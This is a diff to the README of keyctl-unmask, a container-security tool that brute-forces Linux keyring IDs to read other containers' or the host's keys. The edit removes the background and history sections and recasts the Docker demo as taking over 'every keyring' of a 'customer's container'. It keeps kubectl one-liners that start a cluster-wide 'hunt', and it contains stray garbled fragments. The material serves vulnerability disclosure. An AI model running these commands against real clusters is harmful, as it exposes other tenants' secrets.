@@ -4,21 +4,7 @@ This tool goes Florida on container keyring masks. It is a tool to demonstrate t
 go ru
 See also [antitree/keyctl-unmask](https://hub.docker.com/repository/docker/antitree/keyctl-unmask) on Dockerhub
 
-## Background 
 
-Container security folks have known that keyctl usage within containers 
-is a risky operation because there is no inherent way to isolate the Linux Kernel's
-keyrings and keys that often store sensitive content. 
-
-the `keyctl()` syscall allows a user to interact with Linux kernel keyrings
-which store sensitive information per user, session, threat, or process (among
-others). These keyrings are used by different applications and are usually in
-`/proc/keys`. 
-
-For containers, this was deemed a security risk ( and you might agree ) because you
-don't want your containers to be able to see your hosts' keys/keyrings or other
-containers' keyrings.  
-pipkill t
 
 On part of the original fix for this was to simply "mask" `/proc/keys` so that `cat
 /proc/keys` would return no results. 
@@ -74,122 +60,34 @@ Usage:
 
 ~~~
 
-## Usage In Kubernetes
+## Example in Docker
 
-Most Kubernetes clusters have the "benefit" of running without seccomp enabled so
-you can it like so:
+Let me demonstrate how you can brute force all the keys of a host and take over every keyring. 
 
-```shell
-kubectl run --rm -i \
-      -t keyctl-unmask --image=keyctl-unmask \
-      --image-pull-policy=Never --restart=Never \
-      -- keyctl-unmask -hunt  
-```
-
-### Kubernetes One Off Pod With Progress Bar
-
-The following one liner will start a hunt into the kubernetes cluster and 
-return the results with the progress bar in a clean way. 
+In one container (called secret-server), create a new key representing a secret stored by a container:
 
 ~~~shell
-kubectl run whatever --rm -it --generator=Pod --image-pull-policy=Never \
-      --restart=Never --image=antitree/keyctl-unmask \
-      --overrides="$(cat example/k8s/keyctl-unmask-run.json)"
-~~~
+docker run --name secret-server -it --security-opt \
+    seccomp=unconfined antitree/keyctl-unmask /bin/bash 
 
-## Projects With Keyctl Related Code
-
-Here are some other projects that seem to be using keyctl syscalls (but don't hate on them, IDK if they need to run in containers):
-
-* `azcopy` for Azure
-* [This container image processing library](https://github.com/containers/image/blob/21244c96ad792ef415068dc1bc1ab82dffb68dc3/pkg/docker/config/config_linux.go)
-* systemd unit files
-* [trezord](https://github.com/trezor/trezor-core/blob/master/tools/keyctl)
-* [neo4j](https://github.com/neo4j-apps/neo4j-desktop/wiki/Troubleshooting-(Linux))
-* [kerberos](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux)
-* [cyberark](https://docs.cyberark.com/Product-Doc/OnlineHelp/AAM-DAP/Latest/en/Content/Deployment/MasterKeyEncryption/serverkeyencryption.html)
-* sssd-common
-* nfs-common
-* ceph-common
-* libecryptfs1
-* ecryptfs-utils
-* cifs-utils
-* [Google fscryptctl](https://github.com/google/fscryptctl/blob/142326810eb19d6794793db6d24d0775a15aa8e5/fscryptctl.c#L100)
-
-## Demo Docker
-
-In one container, create a new key representing a secret stored by a container:
-
-~~~shell
-docker run --name secret-server -it --security-opt seccomp=unconfined antitree/keyctl-unmask /bin/bash \
 > keyctl add user antitrees_secret thetruthisiliketrees @s
-123456789
+911117332
 > keyctl show
 Session Keyring
  899321446 --alswrv      0     0  keyring: _ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852
  911117332 --alswrv      0     0   \_ user: antitrees_secret
 ~~~
 
-If we were cheating, we could see that we have a session keyring ID of 899321446
-and a user key ID of 911117332. The secret is in the key but we can't access the
-key without linking the session. 
+We see that our customer's container has a session keyring ID of 899321446
+and a user key ID of 911117332. 
 
 Start a separate container and attach a shell so we can test some things
 
 ~~~shell
 docker run -it --name keyctl-attacker --security-opt seccomp=unconfined antitree/keyctl-unmask /bin/bash
 ~~~
-
-To begin, lets prove that Docker is masking the `/proc/keys` path:
-
-~~~shell
-root@keyctl-attacker:/# cat /proc/keys
-root@keyctl-attacker:/# 
-~~~
-
-Nothing. Because it's masked by an overmount. 
-
-The `keyctl` tool is designed to let us interact with keyrings and keys in Linux, this demonstrates the problem:
-
-
-Show me the current user's session:
-
-~~~shell
-root@keyctl-attacker:/# keyctl show
-Session Keyring
- 966368664 --alswrv      0     0  keyring: _ses.94e0b6836d5f343f2a288731c26c96e4656591fbec68c556b5dab32390a04024
-~~~
-
-To demonstrate the problem, I'm going to show you what happens even if you know the key ID of the secret:
-
-~~~shell
-root@keyctl-attacker:/# keyctl print 123456789
-keyctl_read_alloc: Permission denied
-~~~
-
-But why? I thought we said we're root and everything isn't isolated. The problem
-here is that we don't "Possess" the key which means the key/keyring isn't in one
-of the keyrings our account uses (@s, @us, @u, @p, @t,...).  In order to Possess
-the key, we have to Link the key's parent Keyring to a Keyring that we own. 
-
-Again, if you know the key ID's here how you could link the parent keyring to
-your session keyring, show the keys, and then print the key we really wanted
-access to . 
-
-~~~shell
-root@keyctl-attacker:/# keyctl link 899321446 @s
-root@keyctl-attacker:/# keyctl show
-Session Keyring
- 966368664 --alswrv      0     0  keyring: _ses.94e0b6836d5f343f2a288731c26c96e4656591fbec68c556b5dab32390a04024
- 899321446 --alswrv      0     0   \_ keyring: _ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852
- 911117332 --alswrv      0     0       \_ user: antitrees_secret
-root@keyctl-attacker:/# keyctl print 911117332
-thetruthisiliketrees
-~~~
-
-...But you don't know the user key ID or, more importantly the keyring ID. This
-is a problem that `keyctl-unmask` fixes. We don't know the parent keyring ID...
-so lets guess it!
+But Docker masks it. So why not just guess the keyIDs? That's what `keyctl-unmask` is going to do. Take a range from 0 to 999999999 
+and try every possible key ID. On a modern computer it takes less than 10 minutes. 
 
 ~~~shell
 root@keyctl-attacker:/# keyctl-unmask -min 0 -max 999999999
@@ -227,6 +125,30 @@ root@keyctl-attacker:/# cat keyctl_ids
  ]
 ~~~
 
+
+## Usage In Kubernetes
+
+Most Kubernetes clusters have the "benefit" of running without seccomp enabled so
+you can it like so:
+
+```shell
+kubectl run --rm -i \
+      -t keyctl-unmask --image=keyctl-unmask \
+      --image-pull-policy=Never --restart=Never \
+      -- keyctl-unmask -hunt  
+```
+
+### Kubernetes One Off Pod With Progress Bar
+
+The following one liner will start a hunt into the kubernetes cluster and 
+return the results with the progress bar in a clean way. 
+
+~~~shell
+kubectl run whatever --rm -it --generator=Pod --image-pull-policy=Never \
+      --restart=Never --image=antitree/keyctl-unmask \
+      --overrides="$(cat example/k8s/keyctl-unmask-run.json)"
+~~~
+
 ## Demo Kubernetes 
 
 Deploying as a Job will run this on each node in the cluster to let you figure out 
@@ -250,41 +172,6 @@ kubectl exec -it -n test keyctl-unmask-debug-pod -- /bin/bash
 ...
 ```
 
-
-
-## History of Containers and KEYCTL Syscall
-
-The history of this issue goes like this:
-
-1. Docker did not protect /proc/keys at all allowing all users to access the host keys
-1. Someone finds a memory corruption [bug](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9529) WRT the `keyctl()` syscall
-1. Jesse Frazelle sees this issue and fixes it with a seccomp profile (that is sometimes disabled)
-1. Docker realized that this should be protected so they add a mask over /proc/keys so that if you were to `cat /proc/keys` you wouldn't see it
-1. In 2016, `stefanberger` thinks that each container should create its own session key. An [Epic Discussion is had](https://github.com/opencontainers/runc/pull/488). Concluding with:
-   > "With the patch, each container gets its own session keyring. However, it does work better with user namespaces enabled than without it. With user namespaces each container has its own session keyring _ses and a 'docker exec' joins this session keyring. **Without user namespaces enabled, each container also gets a session keyring on 'docker run' but a 'docker exec' again joins the first created session keyring so that containers share it.** The advantage still is that it's not a keyring shared with the host, even though in the case that user namespaces are not enabled, the containers end up sharing a session keyring upon 'docker exec.'"
-1. Jesse Frazelle requests an option to disable the mask so she can do sketchy things in her custom container based FrazelleOS. The option is called [Masked Paths](https://github.com/moby/moby/pull/36644/files). 
-1. This is part of moby OCI defaults as the [MaskedPaths spec](https://github.com/moby/moby/blob/10866714412aea1bb587d1ad14b2ce1ba4cf4308/oci/defaults.go) but isn't exposed via Docker. 
-1. In 2019, the Linux Kernel adds support for [Keys Namespaces](https://lwn.net/Articles/779895/) but Moby does not support it. 
-
-The current state is that seccomp successfully defends from any risk here but it's a secondary security control so not a robust solution. 
-(*cough Kubernetes *cough)  
-User-Namespacing again will again save the day because a seperate namespace is created which includes one for a keyring -- but this isn't enabled by default.
-
-So we're back at where we were in 2016, containers using the keyring have a shared session keyring and inherently share private information with eachother. 
-
-
-## Further Reading
-
-* [Blog About this Issue in 2014](https://www.projectatomic.io/blog/2014/09/yet-another-reason-containers-don-t-contain-kernel-keyrings/)
-* [Overview and Recent Developers of Keyrings Subsystem](https://www.youtube.com/watch?v=KUCwiQZuasA)
-* [Indepth discussion on keys and how Posession works and is important](https://mjg59.dreamwidth.org/37333.html)
-* [keyctl(2) Syscall Man Page](https://man7.org/linux/man-pages/man2/keyctl.2.html)
-* [keyctl from keyutils usage page](https://manpages.debian.org/stretch/keyutils/keyctl.1.en.html)
-* [Linux Kernel Keys and Keyrings Documentation](https://www.kernel.org/doc/Documentation/security/keys.txt)
-* [Example using keyctl to access keys](https://davids-blog.gamba.ca/posts/caching-credentials-linux-keyring-golang/)a
-* [IBM Blog covers syscalls used by keyctl](https://www.ibm.com/developerworks/library/l-key-retention/index.html)
-* [Linux Kernel Trusted and Encrypted Docs](https://www.kernel.org/doc/Documentation/security/keys-trusted-encrypted.txt)
-* 
 
 ## Pre-Emptive Responses To Potential Questions/Comments
 
